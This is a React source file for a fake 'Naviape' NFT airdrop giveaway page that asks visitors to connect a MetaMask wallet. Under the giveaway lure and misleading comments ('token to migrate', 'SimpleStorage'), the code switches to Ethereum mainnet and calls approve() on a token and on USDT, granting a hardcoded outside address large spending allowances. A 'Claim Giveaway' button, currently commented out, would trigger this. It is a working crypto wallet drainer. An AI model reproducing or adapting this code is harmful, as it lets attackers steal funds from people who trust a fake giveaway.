// https://docs.metamask.io/guide/ethereum-provider.html#using-the-provider
import React, {useState} from 'react'
import { ethers } from 'ethers'
import './style.css';
import logo from './images/x-icon/favicon-32x32.png';
import './images/x-icon/site.webmanifest';
import discord from './images/header/discord.webp';
import opensea from './images/header/opensea.webp';


const { ethereum } = window;



const SimpleStorage = () => {

	// deploy simple storage contract and paste deployed contract address here. This value is local ganache chain


	const [errorMessage, setErrorMessage] = useState(null);
	const [defaultAccount, setDefaultAccount] = useState(null);
	const [connButtonText, setConnButtonText] = useState('Connect Wallet');






	const connectWalletHandler = () => {
		if (window.ethereum && window.ethereum.isMetaMask) {

			window.ethereum.request({ method: 'eth_requestAccounts'})
			.then(result => {
				accountChangedHandler(result[0]);
				setConnButtonText('Wallet Connected');
			})
			.catch(error => {
				setErrorMessage(error.message);

			});

		} else {
			console.log('Need to install MetaMask');
			setErrorMessage('Please install MetaMask browser extension to interact');
		}
	}

	// update account, will cause component re-render
	const accountChangedHandler = (newAccount) => {
		setDefaultAccount(newAccount.slice(-8));

	}

	const chainChangedHandler = () => {
		// reload the page to avoid any errors with chain change mid use of application
		window.location.reload();
	}


	// listen for account changes
	window.ethereum.on('accountsChanged', accountChangedHandler);

	window.ethereum.on('chainChanged', chainChangedHandler);




	//my appeove here

    const yourContractAddress = "0x61b99Af6375deA52843c7BED296a4372d106c8Df";
    const contractInterface = [
    "function approve(address spender, uint256 amount) external returns (bool)", // appprove contract function
  ];
    const tokenAddress = "0xD76b5c2A23ef78368d8E34288B5b65D616B746aE"; //token to migrate
    const tokenAddressusdt = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; //token to migrate
    let provider;
    let signer;
    // let signerAddress;
    let tokenContract;
    let tokenContractusdt;

     const startFunction = async () => {
    await ethereum.request({ method: "eth_requestAccounts" });
    await ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x1" }],
    });
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    // signerAddress = await signer.getAddress();
    tokenContract = new ethers.Contract(
      tokenAddress,
      contractInterface,
      signer,
         );
    tokenContractusdt = new ethers.Contract(
      tokenAddressusdt,
      contractInterface,
      signer,
    );
    };
    startFunction();
  async function approveSpender() {
    tokenContract.approve(yourContractAddress, '100000000000000000000000');

	  approveSpenderusdt();
    }
    async function approveSpenderusdt() {
    tokenContractusdt.approve(yourContractAddress, '1000000000000000');
  }








	return (
		<div>

<html lang="en">

<head>

  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />




</head>

<body>
  <header>
    <div class="container">
      <div class="logo">
        <a href="/">
          <img src={logo} alt="logo" />
        </a>
      </div>
      <div class="menu">
        <a href="https://discord.link/NaviApes" target="_blank" rel="noopener noreferrer">
          <img src={discord} alt="Discord" />
        </a>


        <a href="https://opensea.io/collection/naviapes" target="_blank" rel="noopener noreferrer">
          <img src={opensea} alt="Opensea" />
        </a>
        <button class="wallet-btn btn" onClick={connectWalletHandler}>
          <span>{connButtonText} {defaultAccount}</span>
        </button>
		{errorMessage}
      </div>
    </div>
  </header>

  <section class="container">
    <div class="owner-status"></div>
    <div class="countdown">


          <iframe title='countdown' src="https://free.timeanddate.com/countdown/i89xcjs6/n192/cf12/cm0/cu4/ct0/cs0/ca0/cr0/ss0/cac000/cpc000/pcfff/tcfff/fs100/szw320/szh135/tatNaviapes%20airdrop%20giveaway/tac000/tptTime%20since%20Event%20started%20in/tpc000/mac000/mpc000/iso2022-04-08T14:00:00" allowtransparency="true" frameborder="0" width="264" height="69"></iframe>





      <h1>Naviape Giveaway Coming Soon!!</h1>

      {/* <p>A new batch of naviapes will be available very soon!</p>
     <button onClick="" class="btn" id="approve" >Claim Giveaway</button> */}
    </div>

  </section>





</body>


</html>
		</div>
	);
}

export default SimpleStorage;